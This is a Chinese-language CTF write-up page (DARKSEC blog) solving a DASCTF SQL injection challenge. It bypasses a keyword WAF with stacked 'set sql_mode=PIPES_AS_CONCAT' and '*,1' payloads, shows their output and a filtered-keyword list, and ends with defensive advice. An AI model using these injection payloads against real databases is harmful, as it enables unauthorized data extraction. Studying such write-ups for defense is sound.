@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DASCTF SQL注入 — sql_mode=PIPES_AS_CONCAT 类型混淆 Writeup — DARKSEC</title>
+<meta name="description" content="DASCTF盲注靶场实战：40字符WAF限制下的SQL注入，利用sql_mode=PIPES_AS_CONCAT把||从OR变成字符串连接，直接吐flag。">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+<link rel="shortcut icon" href="/assets/images/cat-final.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;margin-left:4px;vertical-align:middle;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ CTF / DASCTF / SQL注入</div>
+        <h1>DASCTF 盲注靶场 — sql_mode 类型混淆直接吐 flag</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-11</span>
+          <span>⏱ 8 min read</span>
+          <span>🏷 SQL注入 / sql_mode / WAF绕过 / CTF</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#overview">题目概览</a></li>
+            <li><a href="#template">推断查询模板：一场漫长的错误假设</a></li>
+            <li><a href="#pipes">核心攻击：sql_mode=PIPES_AS_CONCAT</a></li>
+            <li><a href="#exploit">两种 Payload</a></li>
+            <li><a href="#why">为什么之前的注入全失败</a></li>
+            <li><a href="#summary">总结与防御</a></li>
+          </ul>
+        </div>
+
+        <h2 id="overview">◆ 题目概览</h2>
+        <p>页面只有一个输入框：<code>Give me your flag, I will tell you if the flag is right.</code></p>
+        <pre><code>POST /  query=输入
+→ PHP 7.3.10 + MariaDB 10.3.18（openresty）</code></pre>
+        <p>响应格式固定为 <code>Array([0] =&gt; 1)</code> 或 <code>Array([0] =&gt; 0)</code>，看起来像对查询结果的 <code>var_dump</code>。</p>
+
+        <h3>WAF 规则（实测）</h3>
+        <table>
+          <tr><th>类型</th><th>被过滤</th></tr>
+          <tr><td>关键字</td><td><code>union from where and or if sleep like regexp rlike prepare handler unhex</code></td></tr>
+          <tr><td>语句</td><td><code>insert update delete drop create order outfile extractvalue updatexml floor</code></td></tr>
+          <tr><td>敏感词</td><td><code>flag password information words</code>（大小写不敏感）</td></tr>
+          <tr><td>硬限制</td><td>输入长度 ≤ 40 字符</td></tr>
+        </table>
+
+        <h2 id="template">◆ 推断查询模板：一场漫长的错误假设</h2>
+        <p>在找到正确答案之前，我做了大量探测，其中最关键的几个行为：</p>
+        <pre><code>输入 1    → Array([0] =&gt; 1)
+输入 0    → (empty)          ← 0 被吞
+输入 (0)  → Array([0] =&gt; 0)  ← 括号包着的 0 却显示！
+输入 1||1 → Array([0] =&gt; 1)  ← || 按 OR 计算
+输入 *,1  → Array([0] =&gt; CTF2{...} | [1] =&gt; 1)  ← 🎯 致命一击</code></pre>
+        <p>这些现象几乎把我引向了「无 FROM 的 <code>SELECT &lt;input&gt;</code>」结论，因为：</p>
+        <ul>
+          <li><code>1;select *</code> 只返回一个 1（如果模板带 <code>FROM flag</code>，<code>select * FROM flag</code> 应该返回 flag 内容）</li>
+          <li><code>0</code> 与 <code>(0)</code> 的差异看起来像 PHP 的 <code>if($row[0])</code> 过滤</li>
+        </ul>
+        <p>但真相是模板为：</p>
+        <pre><code>SELECT &lt;input&gt; || flag FROM flag</code></pre>
+        <p>所有矛盾瞬间解释：</p>
+        <table>
+          <tr><th>输入</th><th>实际执行</th><th>结果</th></tr>
+          <tr><td><code>0</code></td><td><code>SELECT 0 || flag FROM flag</code> → <code>0 OR flag</code></td><td>flag 非空→真→1，但…</td></tr>
+          <tr><td><code>(0)</code></td><td><code>SELECT (0) || flag FROM flag</code></td><td>表达式边界差异</td></tr>
+          <tr><td><code>1||1</code></td><td><code>SELECT 1 || 1 || flag FROM flag</code> → <code>1 OR 1 OR flag</code></td><td>恒真→1</td></tr>
+        </table>
+
+        <h2 id="pipes">◆ 核心攻击：sql_mode=PIPES_AS_CONCAT</h2>
+        <p>关键点在于 <code>||</code> 在 MySQL/MariaDB 中的双重身份：</p>
+        <ul>
+          <li><strong>默认 sql_mode</strong>：<code>||</code> 是 <strong>OR 逻辑或</strong></li>
+          <li><strong>sql_mode=PIPES_AS_CONCAT</strong>：<code>||</code> 变成 <strong>字符串连接符</strong>（类似 CONCAT）</li>
+        </ul>
+        <p>所以一旦把 <code>||</code> 变成连接符，<code>1 || flag</code> 就不再是 <code>1 OR flag</code>（结果为 1），而是 <code>'1' + flag值</code> —— <strong>flag 直接拼在输出里！</strong></p>
+
+        <div class="tip-box">
+          <strong>⚠️ 关键细节：</strong>Web 应用每次请求都会新建数据库连接（或从连接池取新连接），<strong>上一次请求里改的 sql_mode 不会保留</strong>。所以必须<strong>在同一个请求内</strong>完成「set + 利用」，分号堆叠查询正好满足。
+        </div>
+
+        <h2 id="exploit">◆ 两种 Payload</h2>
+
+        <h3>Payload 1：sql_mode 类型混淆（最优雅）</h3>
+        <pre><code>query = 1;set sql_mode=PIPES_AS_CONCAT;select 1</code></pre>
+        <p>模板拼接后：</p>
+        <pre><code>SELECT 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM flag
+       └─查询1─┘ └────设置sql_mode────┘ └──────查询3：连接符生效──────┘
+
+查询3: SELECT 1 || flag FROM flag
+      = SELECT '1' 连接 flag 值
+      = 1CTF2{eb7a660e-0240-45e3-8350-a03c3c35ac2e}   ← flag 直接吐出</code></pre>
+        <p>响应：</p>
+        <pre><code>Array([0] =&gt; 1)
+Array([0] =&gt; 1CTF2{...})   ← 🎯</code></pre>
+
+        <h3>Payload 2：`*,1` 直接展开列（最快）</h3>
+        <pre><code>query = *,1</code></pre>
+        <pre><code>SELECT *,1 || flag FROM flag
+       └─┘ └──┬──┘
+        所有列  默认模式下 1 OR flag = 1
+      
+Array([0] =&gt; CTF2{eb7a660e-0240-45e3-8350-a03c3c35ac2e}, [1] =&gt; 1)  ← 🎯</code></pre>
+
+        <div class="flag-box">
+          🏁 最终 flag：<code>CTF2{***}</code>（已按惯例脱敏）
+        </div>
+
+        <h2 id="why">◆ 为什么之前的注入全失败</h2>
+        <table>
+          <tr><th>尝试</th><th>失败原因</th></tr>
+          <tr><td><code>/**/</code> 关键字内注释（<code>fr/**/om</code>）</td><td>MariaDB 解析器把注释当空格，<code>fr om</code> 语法错误；且 WAF 检查注释内容</td></tr>
+          <tr><td><code>/*!50000 FROM */</code> 条件注释</td><td>WAF 检查原始输入中的 <code>from</code>，直接拦截</td></tr>
+          <tr><td>URL 双重编码 <code>%2566rom</code></td><td>PHP 只解码一次，MySQL 收到字面量 <code>%66rom</code> 而非关键字</td></tr>
+          <tr><td>控制字符 \x00-\x1f 连接 <code>fr\x00om</code></td><td>MariaDB 不识别，语法错误</td></tr>
+          <tr><td><code>TABLE</code>/<code>VALUES</code> 语句</td><td>MariaDB 10.3 不支持（MySQL 8.0.19+ / MariaDB 10.6+ 才有）</td></tr>
+          <tr><td><code>HANDLER</code> 读表</td><td>被 WAF 过滤</td></tr>
+          <tr><td>load_file / INTO OUTFILE</td><td>secure_file_priv=NULL，文件操作整体禁用</td></tr>
+          <tr><td>报错注入（extractvalue/updatexml/gtid）</td><td>extractvalue/updatexml 被过滤；错误信息被 PHP 静默</td></tr>
+        </table>
+
+        <p><strong>最大的教训：</strong>一直死磕「绕过 FROM」，却忽略了一个更简单的角度 —— <strong>模板本身就带 <code>FROM flag</code>，只需要让 <code>||</code> 从 OR 变成连接符</strong>。当 WAF 把所有「读表姿势」都堵死时，<code>sql_mode</code> 这种「改变运算符语义」的思路往往能一剑封喉。</p>
+
+        <h2 id="summary">◆ 总结与防御</h2>
+        <h3>攻击链</h3>
+        <ol>
+          <li>确认注入点：<code>SELECT &lt;input&gt; || flag FROM flag</code></li>
+          <li>发现 <code>||</code> 默认是 OR，输出恒为 1，flag 被「短路」</li>
+          <li>同请求内 <code>set sql_mode=PIPES_AS_CONCAT</code>，<code>||</code> 变字符串连接</li>
+          <li><code>1 || flag</code> = <code>'1'+flag值</code> → flag 直接回显</li>
+          <li>或用 <code>*,1</code> 直接展开所有列</li>
+        </ol>
+        <h3>防御建议</h3>
+        <ul>
+          <li>SQL 拼接永远用参数化查询（PDO prepared statement），任何 sql_mode/运算符技巧都无效</li>
+          <li>如果必须拼接：白名单校验输入格式（如仅允许 UUID），而不是黑名单过滤关键字</li>
+          <li>WAF 应同时检查运算符语义变化（<code>||</code>、<code>&amp;&amp;</code>、<code>sql_mode</code> 等非常规注入向量）</li>
+          <li>连接用户默认设置为受限账号（最小权限），不要用 root</li>
+        </ul>
+
+        <p class="post-end">— DARKSEC · 2026-08-11</p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <p>© 2026 DARKSEC · Powered by <span style="color:var(--neon);">deft-dream</span></p>
+  </footer>
+</div>
+</body>
+</html>
